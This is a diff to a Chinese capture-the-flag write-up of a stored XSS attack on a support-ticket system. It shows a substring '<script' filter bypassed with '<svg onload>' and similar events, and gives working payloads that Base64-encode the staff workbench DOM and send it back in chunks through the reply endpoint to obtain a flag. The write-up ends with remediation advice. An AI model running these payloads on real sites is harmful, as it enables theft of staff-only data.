@@ -17,6 +17,7 @@
 | 工单提交 | `POST /ticket`（字段：name / subject / body），成功跳转 `302 -> /ticket/<id>` |
 | 工单详情 | `GET /ticket/<id>`（内容渲染于 `div.bubble`） |
 | 工单回复 | `POST /ticket/<id>/reply`（字段：body），回复展示为 `div.reply` |
+| 本次运行 | 工单 #15（验证 `<script` 子串被删）、#19（`<svg onload>` 绕过）、#21（分块回传工作台 DOM） |
 | 备注 | 早期尝试时环境端口为 13151（配套 web 终端 13142），环境重建后端口变为 13705，题目逻辑一致 |
 
 ## 解题过程
@@ -25,15 +26,23 @@
 
 打开首页，左侧导航可见「客服中心」入口，右侧提示"提交工单后，客服会逐条查看并直接在同一工单里回复你，请记好工单链接"，页面中间是工单提交表单（昵称 / 问题标题 / 详细描述）。（见 `screenshots/01-首页-客服中心工单提交页.png`、`screenshots/10-首页提示-记好工单链接.png`）
 
-提交测试工单"你好"后，服务端 `302` 跳转到 `http://172.17.0.13:13151/ticket/1`（旧环境），工单页显示发起人、内容气泡以及"补充说明…"回复表单（见 `screenshots/02-提交工单-工单1创建.png`）。在工单内回复，内容会以"用户"身份追加显示（见 `screenshots/03-工单内回复演示.png`、`screenshots/05-工单1完整记录-多条回复.png`）。工单编号即 URL 中的数字，可依次递增猜测（见 `screenshots/04-工单编号-浏览器地址栏.png`）。
+提交测试工单"你好"后，服务端 `302` 跳转到工单详情页（旧环境为 `http://172.17.0.13:13151/ticket/1`），工单页显示发起人、内容气泡以及"补充说明…"回复表单（见 `screenshots/02-提交工单-工单1创建.png`）。在工单内回复，内容会以"用户"身份追加显示（见 `screenshots/03-工单内回复演示.png`、`screenshots/05-工单1完整记录-多条回复.png`）。工单编号即 URL 中的数字，可依次递增猜测（见 `screenshots/04-工单编号-浏览器地址栏.png`）。
 
 ### 2. 失败尝试一：SQL 注入（无效）
 
 工单的 name 字段被拼进页面，怀疑存在 SQL 注入。尝试在昵称中注入 `o'neil`，提交后工单正常创建（`302 -> /ticket/5`），页面中名字被原样输出且转义为 `o&#39;neil`，无报错、无注入痕迹（见 `screenshots/06-sqli尝试-o-neil用户名.png`、`screenshots/07-sqli无效-名字被转义输出.png`）。结合"访客模式、无会话"的系统形态，判断不存在 SQL 注入，放弃该方向。
 
-### 3. 失败尝试二：`<script>` 标签 XSS（被过滤）
+### 3. 失败尝试二：`<script>` 被过滤
 
 核心目标是让客服工作台执行脚本，于是直接尝试经典 `<script>` 注入：写了一段读取页面中"密钥"附近文本并自动填入回复框的脚本作为工单内容（见 `screenshots/08-xss尝试-script标签payload.png`），但工单页显示时脚本被完全转义为文本（`&gt;(function(){...}&lt;/script&gt;`），未被执行（见 `screenshots/09-xss失败-script被转义.png`）。观察到的现象说明服务端对 `<script>` 标签做了处理（删除 + 转义）。
+
+为了看清它到底删掉了什么，又提交了一个变体 `<scripts>alert(1)</scripts>`（注意结尾多了一个 `s`）做对照。工单 #15 的页面上显示为：
+
+```
+s>alert(1)</scripts>
+```
+
+开头整串 `<script` 消失了，只留下一个孤零零的 `s`（见 `screenshots/20-scripts变体-过滤只删子串.png`）。这说明过滤并不是解析 HTML 标签，而是**按子串直接删除 `<script` 这 7 个字符**——只要不写出完整的那串字符，就有机会绕过去。
 
 ### 4. 失败尝试三：端口扫描、寻找旁路
 
@@ -51,49 +60,67 @@
   - `<svg onload>` 完整保留（仅被转义）、`javascript:` 协议保留、`onload` 保留；
   - `<iframe srcdoc="<script>...">` 中内层的 `<script` 同样被删。（见 `screenshots/15-过滤分析-svg的onload与javascript保留.png`）
 
-**推论**：服务端特意维护了一个"删除 `<script` / `onerror`"的黑名单过滤器。若所有页面都像用户工单页一样做 HTML 转义渲染，这种黑名单删除毫无必要——它必然是为了防住某个**以不安全方式渲染用户内容**的页面，也就是客服工作台（`|safe` / innerHTML 渲染）。同时，黑名单只删 `<script` 和 `onerror`，其他标签与事件（`svg`、`onload`、`ontoggle`、`javascript:` 等）全部放行，说明可以轻松绕过。
+**推论**：服务端特意维护了一个"删除 `<script` / `onerror`"的黑名单过滤器，而且从 `<scripts>` 只剩 `s>` 的实验可以确认，它删的是**子串**而非标签。若所有页面都像用户工单页一样做 HTML 转义渲染，这种黑名单删除毫无必要——它必然是为了防住某个**以不安全方式渲染用户内容**的页面，也就是客服工作台（`|safe` / innerHTML 渲染）。同时，黑名单只删 `<script` 和 `onerror`，其他标签与事件（`svg`、`onload`、`ontoggle`、`javascript:` 等）全部放行，说明可以轻松绕过。
 
-### 6. 构造存储型 XSS 并验证执行（`<svg onload>` 绕过）
+### 6. 绕过成功：`<svg onload>` 打通回传
 
-利用黑名单的缺口，构造 payload：用 **`<svg onload>`**（或 `<svg/onload>`）替代 `<script>` 与 `onerror`，脚本通过**同源 fetch 调用工单回复接口** `POST /ticket/<id>/reply`，把执行结果以"客服回复"形式写回工单——这样刷新工单页即可读取，无需外部服务器，形成完整回传通道：
+既然 `<script` 和 `onerror` 被删，就换用放行的标签与事件。构造 **`<svg onload>`**（或 `<svg/onload>`）payload：脚本通过**同源 fetch 调用工单回复接口** `POST /ticket/<id>/reply`，把执行结果以"客服回复"形式写回工单——刷新工单页即可读取，无需外部服务器。
+
+工单 #19（昵称 `probe-svg`，标题 `svg-test`）提交的 payload：
 
 ```html
-<svg onload="fetch('/ticket/5/reply',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'body=PWN-SVG-'+Date.now()})">
-<details open ontoggle="fetch('/ticket/5/reply',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'body=PWN-DETAILS-'+Date.now()})">x</details>
-<input autofocus onfocus="fetch('/ticket/5/reply',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'body=PWN-INPUT-'+Date.now()})">
-<svg/onload="fetch('/ticket/5/reply',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'body=PWN-SVG2X-'+Date.now()})">
+<svg onload="fetch('/ticket/19/reply',{method:'POST', body:new URLSearchParams({body:'PWN-SVG-'+Date.now()})})">
 ```
 
-提交后等待客服查看，很快工单 #5 中出现了新的"客服回复"：
+提交后很快工单里出现了新的"客服回复"：
 
 ```
-PWN-SVG2X-1788865744114
-PWN-SVG-1788865744124
+PWN-SVG-1788878721554
 ```
 
-（见 `screenshots/16-xss回传命中-svg-onload.png`）
+（见 `screenshots/21-svg-onload绕过-客服回传命中.png`）
 
 **结论确认**：① 客服确实会（自动）查看该工单；② 客服工作台以未转义方式渲染工单内容，`<svg onload>` 在客服浏览器中执行；③ 工单内的同源 fetch 回复接口可作为回传通道。
 
-### 7. 窃取客服工作台页面内容，定位密钥
+> 更早一次运行（工单 #5）用同样思路先验证过这一点，当时客服回复的是 `PWN-SVG2X-…`（见 `screenshots/16-xss回传命中-svg-onload.png`）。
 
-把 payload 升级为"回传整个客服工作台的 DOM"：将 `document.documentElement.outerHTML` 做 Base64 编码（`btoa(unescape(encodeURIComponent(...)))`），按 1600 字符分块，逐块以 `URLSearchParams` 编码后 fetch 到工单回复接口（`URLSearchParams` 会自动正确处理 Base64 中的 `+`、`=`，避免被当作表单分隔符/填充符解析），每块之间加 80ms 延时避免频率限制：
+### 7. 分块回传客服工作台 DOM
+
+回传通道打通后，接下来要把客服工作台整个页面搬回来。让 AI 写一段 payload：把 `document.documentElement.outerHTML` 做 Base64 编码（`btoa(unescape(encodeURIComponent(...)))`），按 **160 字符**分块，逐块用 `URLSearchParams` 编码后 fetch 到当前工单的回复接口；工单 `id` 直接从 `location.pathname` 里取，所以这段 payload 换到任意工单都能用；每块之间加 80ms 延时避免请求过于密集（见 `screenshots/22-ai编写回传payload.png`）：
 
 ```html
-<svg onload="(async()=>{const h=btoa(unescape(encodeURIComponent(document.documentElement.outerHTML)));const c=1600;for(let i=0;i<h.length;i+=c){const fd=new URLSearchParams();fd.append('body','HTMLSEG-'+i+'-'+h.slice(i,i+c));await fetch('/ticket/7/reply',{method:'POST',body:fd});await new Promise(r=>setTimeout(r,80))}})()">
+<svg onload="(async()=>{
+const id = location.pathname.split('/').pop();
+const h = btoa(unescape(encodeURIComponent(document.documentElement.outerHTML)));
+const c = 160;
+for (let i = 0; i < h.length; i += c) {
+  const fd = new URLSearchParams();
+  fd.append('body', 'HTMLSEG-' + i + '-' + h.slice(i, i+c));
+  await fetch('/ticket/' + id + '/reply', {method:'POST', body: fd});
+  await new Promise(r => setTimeout(r, 80));
+}
+})()">
 ```
 
-工单 #7 中随后出现 4 段 `HTMLSEG-0/1600/3200/4800` 回复（见 `screenshots/17-工作台dom分段回传.png`），取回拼合后 Base64 解码，得到客服工作台完整页面（标题"客服工作台 · 社交平台"，工单 #7 · 待处理），其中包含：
+工单 #21 中随后出现大量"客服回复"，形如 `HTMLSEG-0-`、`HTMLSEG-160-`、`HTMLSEG-320-`……每条后面跟着一段 Base64 数据（见 `screenshots/23-工单21-htmlseg分段回传.png`）。
+
+> 更早一次运行（工单 #7）用的是 1600 字符分块，收到 4 段 `HTMLSEG-0/1600/3200/4800`（见 `screenshots/17-工作台dom分段回传.png`）。
+
+### 8. 识别编码格式并还原页面
+
+把 `HTMLSEG-…` 后面的那串字符拿给 AI 看，AI 判断这是被分段传输的 Base64 编码数据，并演示了拼接解码（见 `screenshots/24-ai识别base64格式.png`）。于是按 `HTMLSEG-` 后面的偏移量把各段顺序拼接、Base64 解码，再交给 AI 还原成一个可以直接打开的完整 HTML 文件——即客服工作台页面，带侧边栏与工单卡片（见 `screenshots/25-ai还原完整html.png`）。
+
+> 注意：AI 的"还原"是**可读性优先的重建**，并非逐字节照抄——它给取不到的 `/s.css` 补了一段模拟样式，还把页面标题改写成了「聊天界面 · 社交面板」；而回传数据里解出的原始标题其实是「客服工作台 · 社交平台」（尾部 `…5Lqk5bmz5Y+wPC90aXRsZT4K` 即 `社交平台</title>`）。因此重建页面的排版细节可能与原页面有出入，但其中的密钥字符串是原样保留的。
+
+### 9. 找到内部工单密钥
+
+在还原出的 HTML 源码中，内部密钥以 `<div class="mono">` 的形式出现：
 
 ```html
-<div class="row"><span class="pill">内部视图</span></div>
-...
-<div class="name">本次会话内部工单密钥</div>
-<p class="sub" style="margin-top:4px">客服系统内部凭据，仅客服可见，请勿外泄。</p>
 <div class="mono">vmc{Hq5YfJUslKpFHbZib5G1vOEddNVTszZg}</div>
 ```
 
-（工作台页面截图 `screenshots/18-客服工作台-内部工单密钥.png` 由回传的完整 HTML 按原样式展示还原，内容与客服实际所见一致；该页面外部无法直接访问）
+（见 `screenshots/26-还原源码中找到密钥.png`；更早一次运行还原出的页面里是同一个密钥，见 `screenshots/18-客服工作台-内部工单密钥.png`）
 
 **辅助确认**：执行 `location.href` 回传，确认客服工作台真实地址为 `http://127.0.0.1/agent/ticket/8`（客服容器内访问）；从外部直接访问 `http://172.17.0.13:13705/agent/ticket/8` 返回 **403**，印证"普通用户无法访问"（见 `screenshots/19-工作台URL确认-agent路径.png`）。
 
@@ -118,19 +145,20 @@ vmc{Hq5YfJUslKpFHbZib5G1vOEddNVTszZg}
 ### 关键点
 
 - **从"过滤行为"反推"渲染方式"**：服务端删除 `<script`/`onerror` 这个动作本身，暴露了存在未转义渲染页面这个事实，这是本题最重要的推理线索；
-- **黑名单绕过**：黑名单只删 `script` 标签与 `onerror` 事件，<svg onload>、<details ontoggle>、<input onfocus>、javascript: 等均放行；
+- **黑名单只删子串**：`<scripts>alert(1)</scripts>` 提交后页面上只剩 `s>alert(1)</scripts>`，证明服务端删的是 `<script` 这 7 个字符而不是解析标签；`<svg onload>`、`<details ontoggle>`、`<input onfocus>`、`javascript:` 等自然全部放行；
 - **回传通道**：客服浏览器与工单系统同源，直接用 fetch 调 `POST /ticket/<id>/reply` 即可把任意内容以"客服回复"形式写回，用户刷新可见，无需外部服务器；
-- **编码细节**：回传 Base64 时用 `URLSearchParams` 构造请求体，`+` 不会被解码为空格；分段回传规避单条回复长度限制。
+- **编码细节**：回传 Base64 时用 `URLSearchParams` 构造请求体，`+` 不会被解码为空格；分块大小按回复长度限制调整（160 / 1600 均可），块间加延时避免请求过快；
+- **AI 辅助**：手工试验摸清过滤规则后，把重复性的编码/解码工作交给 AI——payload 由 AI 生成（自动取工单 id、控制分块与延时），回传数据的格式识别与还原也由 AI 完成，效率明显更高。
 
 ### 失败尝试回顾
 
 1. SQL 注入（`o'neil`）：无注入点，存储时转义，放弃；
-2. `<script>` 标签 XSS：被"删除 + 转义"双重处理，失败，但借此摸清了过滤规则；
+2. `<script>` 标签 XSS：被"删除 + 转义"双重处理，失败，但借此摸清了过滤规则；`<scripts>` 变体进一步证实过滤是子串删除；
 3. 端口扫描 / 配套 Web 终端（13142）：只是环境容器 shell（ctf 用户、无 flag），非本题攻击面。
 
 ### 修复建议
 
-1. **禁用"删除敏感词"式过滤**：输入过滤应采用"允许列表"或由输出端做**上下文感知的编码**（HTML 实体转义、属性编码等），而不是黑名单删除；
+1. **禁用"删除敏感词"式过滤**：输入过滤应采用"允许列表"或由输出端做**上下文感知的编码**（HTML 实体转义、属性编码等），而不是黑名单删除——按子串删除 `<script` 既拦不住绕过（`<scripts>` 实测），也掩盖不了输出端的问题；
 2. **客服工作台同样对用户内容转义**，若确需富文本，使用白名单清洗器（如 DOMPurify）+ 严格 CSP（`script-src 'none'`）作为纵深防御；
 3. **敏感数据最小化暴露**：内部密钥等不应以明文存在于客服页面 DOM（或任何可被同源脚本读取的位置），应由后端接口权限校验后按需下发；
 4. **权限隔离**：工作台路由除网络层限制（127.0.0.1）外，还应增加服务端身份认证，防止越权访问。
